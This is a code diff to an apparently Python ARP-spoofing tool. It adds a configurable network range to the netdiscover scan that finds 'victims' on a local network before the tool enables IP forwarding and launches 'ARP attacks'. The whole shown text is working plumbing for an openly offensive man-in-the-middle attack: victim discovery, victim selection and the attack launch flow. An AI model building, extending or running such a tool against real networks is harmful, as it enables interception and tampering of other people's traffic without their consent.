@@ -42,10 +42,10 @@ def get_local_ip():
         logging.error("Failed to fetch the local IP address")
         sys.exit(1)
 
-def sniff_packets(interface, count=10, duration=10):
+def sniff_packets(interface, duration=10, network_range="192.168.0.0/16"):
     logging.info("Sniffing packets on interface %s for %d seconds...", interface, duration)
     try:
-        process = subprocess.Popen(['netdiscover', '-i', interface, '-c', str(count), '-P'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        process = subprocess.Popen(['netdiscover', '-i', interface, '-r', network_range, '-P'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
         output, _ = process.communicate(timeout=duration)
         if process.returncode == 0:
             return output.decode().splitlines()
@@ -84,8 +84,8 @@ def select_victim(victim_ips, victim_macs):
     print("Invalid choice. Please enter a valid number.")
     return None
 
-def get_victim_info(interface, duration):
-    output_lines = sniff_packets(interface, duration=duration)
+def get_victim_info(interface, duration, network_range):
+    output_lines = sniff_packets(interface, duration=duration, network_range=network_range)
     victim_ips, victim_macs = extract_victim_info(output_lines)
     if not victim_ips:
         logging.info("No victims found during the specified duration.")
@@ -160,6 +160,7 @@ def main(args):
     verbose = args.verbose
     log_file = args.log_file
     duration = args.duration
+    network_range = args.network_range
 
     setup_logging(verbose, log_file)
 
@@ -174,7 +175,7 @@ def main(args):
         enable_ip_forwarding()
         logging.info("Preparing to launch ARP attacks...")
 
-        victim_ip = get_victim_info(interface, duration)
+        victim_ip = get_victim_info(interface, duration, network_range)
         if not victim_ip:
             sys.exit(1)
 
@@ -199,6 +200,8 @@ if __name__ == "__main__":
     parser.add_argument("-p", "--interval", type=int, default=1, help="Interval between ARP packets (default: 1 second)")
     parser.add_argument("-l", "--log_file", help="File to write log output")
     parser.add_argument("-d", "--duration", type=int, default=10, help="Duration (in seconds) to run netdiscover (default: 10 seconds)")
+    parser.add_argument("-n", "--network_range", default="192.168.0.0/16", help="Network range for netdiscover (default: 192.168.0.0/16)")
     args = parser.parse_args()
     print(doggy)
     main(args)
+
